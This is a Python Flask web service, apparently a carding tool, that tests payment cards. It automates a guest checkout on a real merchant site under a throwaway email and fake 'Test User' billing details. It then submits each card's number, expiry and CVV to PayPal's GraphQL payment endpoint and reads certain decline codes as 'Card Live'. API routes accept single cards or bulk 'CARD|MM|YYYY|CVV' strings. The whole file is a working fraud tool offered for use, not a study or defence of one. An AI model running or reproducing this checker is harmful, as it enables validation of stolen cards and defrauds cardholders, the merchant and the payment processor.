import os
import re
import json
from re import search
from random import choice
from requests import Session
from string import ascii_letters, digits
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder='static')
CORS(app)

# ============================================
# UTILIDADES
# ============================================

def gen_user():
    return ''.join(choice(ascii_letters + digits) for _ in range(14))

def gen_mail():
    return f'{gen_user()}@gmail.com'

def card_verify(data):
    try:
        ccs = search(r'(\d{15,16})+?[^0-9]+?(\d{1,2})[\D]*?(\d{2,4})[^0-9]+?(\d{3,4})', data).groups()
        return {
            'card': ccs[0],
            'mes': ccs[1],
            'ano': ccs[2] if len(ccs[2]) == 4 else f"20{ccs[2]}",
            'cvv': ccs[3]
        }
    except:
        return {'card': None, 'mes': None, 'ano': None, 'cvv': None}

# ============================================
# PAYPAL GATE - CÓDIGO REAL
# ============================================

def paypal12_gate(card, mes, ano, cvv):
    session = Session()
    mail = gen_mail()
    cctype = {"4": "VISA", "5": "MASTER_CARD", "3": "AMEX"}.get(card[0], "VISA")
    
    log = []
    log.append(f"[*] Card Type: {cctype}")
    log.append(f"[*] Email: {mail}")
    
    try:
        # Headers base
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-ES,es;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        # Step 1: Get product page
        log.append("[*] Step 1: Getting product page...")
        response = session.get('https://tdmach.com/product/0599x-lift-stand-height-gage/', headers=headers)
        log.append(f"[*] Status: {response.status_code}")
        
        # Step 2: Add to cart
        log.append("[*] Step 2: Adding to cart...")
        headers2 = headers.copy()
        headers2['content-type'] = 'multipart/form-data; boundary=----WebKitFormBoundaryr9cKFP9driNYwHyv'
        headers2['origin'] = 'https://tdmach.com'
        headers2['referer'] = 'https://tdmach.com/product/0599x-lift-stand-height-gage/'
        
        data = '------WebKitFormBoundaryr9cKFP9driNYwHyv\r\nContent-Disposition: form-data; name="attribute_pa_brand"\r\n\r\nfowler\r\n------WebKitFormBoundaryr9cKFP9driNYwHyv\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryr9cKFP9driNYwHyv\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n4498\r\n------WebKitFormBoundaryr9cKFP9driNYwHyv\r\nContent-Disposition: form-data; name="product_id"\r\n\r\n4498\r\n------WebKitFormBoundaryr9cKFP9driNYwHyv\r\nContent-Disposition: form-data; name="variation_id"\r\n\r\n4515\r\n------WebKitFormBoundaryr9cKFP9driNYwHyv--\r\n'
        
        response = session.post('https://tdmach.com/product/0599x-lift-stand-height-gage/', headers=headers2, data=data)
        log.append(f"[*] Status: {response.status_code}")
        
        # Step 3: Checkout
        log.append("[*] Step 3: Going to checkout...")
        response = session.get('https://tdmach.com/checkout/', headers=headers)
        log.append(f"[*] Status: {response.status_code}")
        
        # Step 4: Create PayPal Order
        log.append("[*] Step 4: Creating PayPal order...")
        headers3 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://tdmach.com',
            'referer': 'https://tdmach.com/checkout/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'nonce': 'f0f24ede16',
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_email={mail}&billing_first_name=Test&billing_last_name=User&billing_country=US&billing_address_1=123+Test+St&billing_city=Los+Angeles&billing_state=CA&billing_postcode=90001&billing_phone=%2B12831228405&shipping_first_name=Test&shipping_last_name=User&shipping_country=US&shipping_address_1=123+Test+St&shipping_city=Los+Angeles&shipping_state=CA&shipping_postcode=90001&payment_method=ppcp-gateway&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }
        
        response = session.post('https://tdmach.com/', params={'wc-ajax': 'ppc-create-order'}, headers=headers3, json=json_data)
        log.append(f"[*] Status: {response.status_code}")
        
        # Extract PayPal ID
        try:
            paypal_id = re.search(r'"id"\s*:\s*"([^"]+)"', response.text).group(1)
            log.append(f"[*] PayPal ID: {paypal_id}")
        except:
            log.append("[!] Error: Could not get PayPal ID")
            return {'status': 'Error ⚠️', 'message': 'Failed to create PayPal order', 'code': 'NO_PAYPAL_ID', 'log': log}
        
        # Step 5: Send card to PayPal GraphQL
        log.append("[*] Step 5: Sending to PayPal GraphQL...")
        headers4 = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': paypal_id,
            'paypal-client-metadata-id': paypal_id,
            'referer': f'https://www.paypal.com/smart/card-fields?token={paypal_id}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }
        
        graphql_data = {
            'query': '''
                mutation payWithCard($token: String!, $card: CardInput, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
                    approveGuestPaymentWithCreditCard(token: $token, card: $card, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
                        flags { is3DSecureRequired }
                        cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } }
                        paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
                    }
                }
            ''',
            'variables': {
                'token': paypal_id,
                'card': {
                    'cardNumber': card,
                    'type': cctype,
                    'expirationDate': f'{mes}/{ano}',
                    'postalCode': '90001',
                    'securityCode': cvv,
                },
                'firstName': 'Test',
                'lastName': 'User',
                'billingAddress': {
                    'givenName': 'Test',
                    'familyName': 'User',
                    'line1': '123 Test Street',
                    'city': 'Los Angeles',
                    'state': 'CA',
                    'postalCode': '90001',
                    'country': 'US',
                },
                'email': mail,
                'currencyConversionType': 'VENDOR',
            },
        }
        
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers4, json=graphql_data)
        log.append(f"[*] GraphQL Status: {response.status_code}")
        
        data = json.loads(response.text)
        
        # Parse response
        try:
            buyer = data["data"]["approveGuestPaymentWithCreditCard"]["cart"]["buyer"]
            log.append("[+] APPROVED - Buyer found")
            return {'status': 'Approved ✅', 'message': 'Card validated successfully', 'code': 'APPROVED', 'log': log}
        except:
            pass
        
        if 'errors' in data:
            for error in data['errors']:
                if isinstance(error.get('data'), dict):
                    log.append("[+] APPROVED - Dict response")
                    return {'status': 'Approved ✅', 'message': 'Approved', 'code': 'APPROVED', 'log': log}
                
                if isinstance(error.get('data'), list):
                    for item in error['data']:
                        if isinstance(item, dict):
                            field = item.get('field', '')
                            code = item.get('code', '')
                            message = error.get('message', '')
                            
                            log.append(f"[*] Code: {code} | Message: {message}")
                            
                            if message == "PAYER_CANNOT_PAY":
                                return {'status': 'Approved ✅', 'message': 'PAYER_CANNOT_PAY (Card Live)', 'code': 'PAYER_CANNOT_PAY', 'log': log}
                            
                            if code in ['INVALID_SECURITY_CODE', 'EXISTING_ACCOUNT_RESTRICTED', 'INVALID BILLING ADDRESS']:
                                return {'status': 'Approved ✅', 'message': f'{code} (Card Live)', 'code': code, 'log': log}
                            else:
                                return {'status': 'Declined ❌', 'message': f'{code} ({message})', 'code': code, 'log': log}
        
        log.append("[?] Unknown response")
        return {'status': 'Unknown ⚠️', 'message': 'Unknown response', 'code': 'UNKNOWN', 'log': log}
        
    except Exception as e:
        log.append(f"[!] Exception: {str(e)}")
        return {'status': 'Error ⚠️', 'message': str(e), 'code': 'EXCEPTION', 'log': log}

# ============================================
# ROUTES
# ============================================

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/api/check', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        card = data.get('card', '').replace(' ', '').replace('-', '')
        month = data.get('month', '').zfill(2)
        year = data.get('year', '')
        cvv = data.get('cvv', '')
        
        if not card or len(card) < 13:
            return jsonify({'status': 'Error', 'message': 'Invalid card number'}), 400
        if not month or not year or not cvv:
            return jsonify({'status': 'Error', 'message': 'Missing fields'}), 400
        
        result = paypal12_gate(card, month, year, cvv)
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'Error', 'message': str(e)}), 500

@app.route('/api/check-raw', methods=['POST'])
def check_card_raw():
    try:
        data = request.get_json()
        raw = data.get('raw', '')
        card_info = card_verify(raw)
        
        if not all(card_info.values()):
            return jsonify({'status': 'Error', 'message': 'Invalid format. Use: CARD|MM|YYYY|CVV'}), 400
        
        result = paypal12_gate(card_info['card'], card_info['mes'], card_info['ano'], card_info['cvv'])
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'Error', 'message': str(e)}), 500

@app.route('/health')
def health():
    return jsonify({'status': 'ok'})

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
